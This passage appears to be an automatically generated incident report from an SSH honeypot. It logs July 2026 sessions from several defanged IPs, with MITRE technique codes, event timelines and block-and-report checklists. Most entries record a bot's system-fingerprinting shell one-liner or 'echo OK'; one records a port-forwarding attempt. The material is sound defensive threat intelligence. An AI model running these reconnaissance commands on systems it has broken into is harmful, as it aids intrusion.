| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:17:23` | `cowrie.session.connect` |
| `2026-07-05 09:17:23` | `cowrie.client.version` |
| `2026-07-05 09:17:23` | `cowrie.client.kex` |
| `2026-07-05 09:17:24` | `cowrie.login.success` |
| `2026-07-05 09:17:25` | `cowrie.session.params` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.success` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:25` | `cowrie.command.input` |
| `2026-07-05 09:17:26` | `cowrie.log.closed` |
| `2026-07-05 09:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd663468833

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:18 |
| **Last Seen** | 2026-07-05 09:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:18:55` | `cowrie.session.connect` |
| `2026-07-05 09:18:55` | `cowrie.client.version` |
| `2026-07-05 09:18:55` | `cowrie.client.kex` |
| `2026-07-05 09:18:56` | `cowrie.login.success` |
| `2026-07-05 09:18:58` | `cowrie.session.params` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.success` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.command.input` |
| `2026-07-05 09:18:58` | `cowrie.log.closed` |
| `2026-07-05 09:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa49353638f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 09:19 |
| **Last Seen** | 2026-07-05 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:19:45` | `cowrie.session.connect` |
| `2026-07-05 09:19:45` | `cowrie.client.version` |
| `2026-07-05 09:19:45` | `cowrie.client.kex` |
| `2026-07-05 09:19:45` | `cowrie.login.success` |
| `2026-07-05 09:19:46` | `cowrie.session.params` |
| `2026-07-05 09:19:46` | `cowrie.command.input` |
| `2026-07-05 09:19:46` | `cowrie.log.closed` |
| `2026-07-05 09:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef328dc680f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:20 |
| **Last Seen** | 2026-07-05 09:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:20:24` | `cowrie.session.connect` |
| `2026-07-05 09:20:25` | `cowrie.client.version` |
| `2026-07-05 09:20:25` | `cowrie.client.kex` |
| `2026-07-05 09:20:26` | `cowrie.login.success` |
| `2026-07-05 09:20:28` | `cowrie.session.params` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.success` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.command.input` |
| `2026-07-05 09:20:28` | `cowrie.log.closed` |
| `2026-07-05 09:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25775d44d82a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:21 |
| **Last Seen** | 2026-07-05 09:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:21:51` | `cowrie.session.connect` |
| `2026-07-05 09:21:51` | `cowrie.client.version` |
| `2026-07-05 09:21:51` | `cowrie.client.kex` |
| `2026-07-05 09:21:52` | `cowrie.login.success` |
| `2026-07-05 09:21:54` | `cowrie.session.params` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.success` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.command.input` |
| `2026-07-05 09:21:54` | `cowrie.log.closed` |
| `2026-07-05 09:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda58eae4223

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:22 |
| **Last Seen** | 2026-07-05 09:23 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:22:54` | `cowrie.session.connect` |
| `2026-07-05 09:22:56` | `cowrie.client.version` |
| `2026-07-05 09:22:56` | `cowrie.client.kex` |
| `2026-07-05 09:23:01` | `cowrie.login.success` |
| `2026-07-05 09:23:05` | `cowrie.session.params` |
| `2026-07-05 09:23:05` | `cowrie.command.input` |
| `2026-07-05 09:23:07` | `cowrie.log.closed` |
| `2026-07-05 09:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866fc13a8f23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:23 |
| **Last Seen** | 2026-07-05 09:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:23:17` | `cowrie.session.connect` |
| `2026-07-05 09:23:18` | `cowrie.client.version` |
| `2026-07-05 09:23:18` | `cowrie.client.kex` |
| `2026-07-05 09:23:19` | `cowrie.login.success` |
| `2026-07-05 09:23:21` | `cowrie.session.params` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.success` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.command.input` |
| `2026-07-05 09:23:21` | `cowrie.log.closed` |
| `2026-07-05 09:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50ce000d618

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:24 |
| **Last Seen** | 2026-07-05 09:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:24:45` | `cowrie.session.connect` |
| `2026-07-05 09:24:46` | `cowrie.client.version` |
| `2026-07-05 09:24:46` | `cowrie.client.kex` |
| `2026-07-05 09:24:47` | `cowrie.login.success` |
| `2026-07-05 09:24:48` | `cowrie.session.params` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.success` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:48` | `cowrie.command.input` |
| `2026-07-05 09:24:49` | `cowrie.log.closed` |
| `2026-07-05 09:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a8c1a667dbc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:26 |
| **Last Seen** | 2026-07-05 09:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:26:14` | `cowrie.session.connect` |
| `2026-07-05 09:26:14` | `cowrie.client.version` |
| `2026-07-05 09:26:14` | `cowrie.client.kex` |
| `2026-07-05 09:26:15` | `cowrie.login.success` |
| `2026-07-05 09:26:16` | `cowrie.session.params` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.success` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:16` | `cowrie.command.input` |
| `2026-07-05 09:26:17` | `cowrie.log.closed` |
| `2026-07-05 09:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3946c709d81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:27 |
| **Last Seen** | 2026-07-05 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:27:41` | `cowrie.session.connect` |
| `2026-07-05 09:27:41` | `cowrie.client.version` |
| `2026-07-05 09:27:41` | `cowrie.client.kex` |
| `2026-07-05 09:27:42` | `cowrie.login.success` |
| `2026-07-05 09:27:43` | `cowrie.session.params` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.success` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:43` | `cowrie.command.input` |
| `2026-07-05 09:27:44` | `cowrie.log.closed` |
| `2026-07-05 09:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a7473e54ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:29 |
| **Last Seen** | 2026-07-05 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:29:09` | `cowrie.session.connect` |
| `2026-07-05 09:29:09` | `cowrie.client.version` |
| `2026-07-05 09:29:09` | `cowrie.client.kex` |
| `2026-07-05 09:29:10` | `cowrie.login.success` |
| `2026-07-05 09:29:12` | `cowrie.session.params` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.success` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.command.input` |
| `2026-07-05 09:29:12` | `cowrie.log.closed` |
| `2026-07-05 09:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede363c8630a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:34 |
| **Last Seen** | 2026-07-05 09:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:34:11` | `cowrie.session.connect` |
| `2026-07-05 09:34:12` | `cowrie.client.version` |
| `2026-07-05 09:34:12` | `cowrie.client.kex` |
| `2026-07-05 09:34:18` | `cowrie.login.success` |
| `2026-07-05 09:34:21` | `cowrie.session.params` |
| `2026-07-05 09:34:21` | `cowrie.command.input` |
| `2026-07-05 09:34:23` | `cowrie.log.closed` |
| `2026-07-05 09:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818181e95719

| Field | Detail |
|---|---|
| **Source IP** | `120.193.9[.]168` |
| **First Seen** | 2026-07-05 09:35 |
| **Last Seen** | 2026-07-05 09:41 |
| **Session Duration** | 320s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:35:43` | `cowrie.session.connect` |
| `2026-07-05 09:35:44` | `cowrie.client.version` |
| `2026-07-05 09:35:44` | `cowrie.client.kex` |
| `2026-07-05 09:36:03` | `cowrie.login.success` |
| `2026-07-05 09:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.193.9[.]168` to AbuseIPDB if not already reported
- [ ] Block `120.193.9[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af2ca7bb7ff

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:45 |
| **Last Seen** | 2026-07-05 09:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:45:37` | `cowrie.session.connect` |
| `2026-07-05 09:45:39` | `cowrie.client.version` |
| `2026-07-05 09:45:39` | `cowrie.client.kex` |
| `2026-07-05 09:45:45` | `cowrie.login.success` |
| `2026-07-05 09:45:48` | `cowrie.session.params` |
| `2026-07-05 09:45:48` | `cowrie.command.input` |
| `2026-07-05 09:45:50` | `cowrie.log.closed` |
| `2026-07-05 09:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06329d3a5c7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 09:47 |
| **Last Seen** | 2026-07-05 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:47:01` | `cowrie.session.connect` |
| `2026-07-05 09:47:01` | `cowrie.client.version` |
| `2026-07-05 09:47:01` | `cowrie.client.kex` |
| `2026-07-05 09:47:02` | `cowrie.login.success` |
| `2026-07-05 09:47:02` | `cowrie.direct-tcpip.request` |
| `2026-07-05 09:47:02` | `cowrie.direct-tcpip.data` |
| `2026-07-05 09:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bff20a7de1b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:56 |
| **Last Seen** | 2026-07-05 09:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:56:54` | `cowrie.session.connect` |
| `2026-07-05 09:56:55` | `cowrie.client.version` |
| `2026-07-05 09:56:55` | `cowrie.client.kex` |
| `2026-07-05 09:57:01` | `cowrie.login.success` |
| `2026-07-05 09:57:05` | `cowrie.session.params` |
| `2026-07-05 09:57:05` | `cowrie.command.input` |
| `2026-07-05 09:57:06` | `cowrie.log.closed` |
| `2026-07-05 09:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a8a496c24e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 10:08 |
| **Last Seen** | 2026-07-05 10:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
